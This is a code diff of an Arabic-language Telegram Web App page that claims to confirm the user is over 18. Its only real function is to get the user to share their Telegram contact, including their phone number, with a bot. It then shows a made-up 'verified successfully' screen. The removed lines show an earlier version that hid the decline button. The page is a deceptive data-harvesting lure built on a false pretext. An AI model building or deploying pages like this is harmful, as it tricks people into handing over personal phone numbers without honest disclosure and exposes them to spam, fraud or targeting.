@@ -1,67 +1,188 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+  <title>تأكيد الحساب</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;900&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --bg:      #0a0c10;
+      --surface: #111318;
+      --border:  #1e2330;
+      --accent:  #4f8ef7;
+      --accent2: #7c3aed;
+      --text:    #e8eaf0;
+      --muted:   #6b7280;
+      --green:   #22c55e;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      height: 100vh;
+      font-family: 'Cairo', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* الخلفية المزخرفة */
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background:
+        radial-gradient(ellipse 70% 50% at 15% 15%, rgba(79,142,247,.13) 0%, transparent 65%),
+        radial-gradient(ellipse 60% 60% at 85% 85%, rgba(124,58,237,.11) 0%, transparent 65%);
+      z-index: 0;
+    }
+
+    .container {
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      max-width: 340px;
+      padding: 20px;
+    }
+
+    /* ══════════════════════════════
+        البطاقة الرئيسية
+       ══════════════════════════════ */
+    .card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 28px;
+      padding: 35px 24px;
+      text-align: center;
+      box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+      animation: popIn .4s cubic-bezier(.16,1,.3,1);
+    }
+
+    .icon-box {
+      width: 80px; height: 80px;
+      margin: 0 auto 20px;
+      background: linear-gradient(135deg, rgba(79,142,247,.1), rgba(124,58,237,.1));
+      border: 1px solid var(--border);
+      border-radius: 24px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 40px;
+    }
+
+    h2 { font-size: 22px; margin-bottom: 12px; font-weight: 700; }
+    p { font-size: 14px; color: var(--muted); line-height: 1.6; margin-bottom: 25px; }
+
+    /* الأزرار */
+    .btn-main {
+      width: 100%;
+      padding: 16px;
+      border: none;
+      border-radius: 16px;
+      background: linear-gradient(135deg, var(--accent), var(--accent2));
+      color: #fff;
+      font-family: 'Cairo', sans-serif;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: transform .2s;
+      box-shadow: 0 8px 20px rgba(79,142,247,.25);
+    }
+
+    .btn-main:active { transform: scale(.96); }
+
+    /* التحميل */
+    #loading { display: none; flex-direction: column; align-items: center; }
+    .spinner {
+      width: 40px; height: 40px;
+      border: 3px solid var(--border);
+      border-top-color: var(--accent);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 15px;
+    }
+
+    /* صفحة النجاح */
+    #successPage { display: none; }
+    .success-icon { color: var(--green); font-size: 50px; margin-bottom: 15px; }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+    @keyframes popIn { from { opacity: 0; transform: scale(.9); } to { opacity: 1; transform: scale(1); } }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  
+  <div id="ageStep" class="card">
+    <div class="icon-box">🔞</div>
+    <h2>تأكيد العمر</h2>
+    <p>للمتابعة، يرجى تأكيد أن عمرك 18 عاماً أو أكثر عبر مشاركة جهة الاتصال.</p>
+    <button class="btn-main" onclick="confirmAge()">
+      ✅ أؤكد أن عمري +18 عاماً
+    </button>
+  </div>
+
+  <div id="loading" class="card">
+    <div class="spinner"></div>
+    <p>جاري معالجة طلبك...</p>
+  </div>
+
+  <div id="successPage" class="card">
+    <div class="success-icon">✦</div>
+    <h2 style="color: var(--green);">تم التحقق بنجاح</h2>
+    <p>شكراً لك! تم تأكيد حسابك بنجاح في النظام. يمكنك الآن إغلاق هذه الصفحة.</p>
+    <button class="btn-main" style="background: var(--border);" onclick="tg.close()">
+      إغلاق
+    </button>
+  </div>
+
+</div>
+
 <script>
   const tg = window.Telegram.WebApp;
   tg.ready();
   tg.expand();
 
-  const isInsideTelegram = !!(tg.initData && tg.initData.length > 0);
-
-  /* ── تأكيد العمر ── */
   function confirmAge() {
-    document.getElementById('ageOverlay').style.display = 'none';
+    // إخفاء الواجهة الأولى وإظهار التحميل
+    document.getElementById('ageStep').style.display = 'none';
     document.getElementById('loading').style.display = 'flex';
 
-    if (!isInsideTelegram) {
-      setTimeout(() => showSuccess(), 800);
-      return;
-    }
-
+    // طلب الرقم من المستخدم
     if (tg.requestContact) {
       tg.requestContact((shared) => {
-        showSuccess(); // بعد إرسال الرقم
+        if (shared) {
+          // إذا وافق على مشاركة الرقم، ننتظر حدث contactRequested (الذي يرسل البيانات للبوت تلقائياً)
+          // وسنظهر صفحة النجاح بعد قليل
+          setTimeout(showSuccess, 1500);
+        } else {
+          // إذا رفض، نعيده للبداية أو نغلق
+          document.getElementById('ageStep').style.display = 'block';
+          document.getElementById('loading').style.display = 'none';
+        }
       });
     } else {
-      showSuccess();
+      // وضع التجربة خارج تليجرام
+      setTimeout(showSuccess, 1500);
     }
   }
 
-  /* ── إخفاء زر "لا" بالكامل ── */
-  document.querySelector('.btn-deny').style.display = 'none';
-
-  /* ── صفحة النجاح فقط ── */
   function showSuccess() {
     document.getElementById('loading').style.display = 'none';
-
-    document.querySelector('.page').innerHTML = `
-      <div style="
-        height:100vh;
-        display:flex;
-        align-items:center;
-        justify-content:center;
-        flex-direction:column;
-        text-align:center;
-        gap:15px;
-      ">
-        <div style="font-size:60px;">✅</div>
-        <h2 style="color:#22c55e;">تم التحقق من حسابك بنجاح</h2>
-        <p style="color:#6b7280;">يمكنك الآن استخدام الخدمة</p>
-
-        <button onclick="Telegram.WebApp.close()" style="
-          margin-top:20px;
-          padding:12px 18px;
-          border:none;
-          border-radius:10px;
-          background:#4f8ef7;
-          color:#fff;
-          font-weight:bold;
-        ">
-          إغلاق
-        </button>
-      </div>
-    `;
+    document.getElementById('successPage').style.display = 'block';
   }
 
-  /* ── رفض العمر (اختياري) ── */
-  function denyAge() {
-    tg.close();
-  }
+  // الاستماع لحدث استلام جهة الاتصال لضمان الانتقال لصفحة النجاح
+  tg.onEvent('contactRequested', (event) => {
+    if (event.status === 'sent') {
+      showSuccess();
+    }
+  });
 </script>
+
+</body>
+</html>
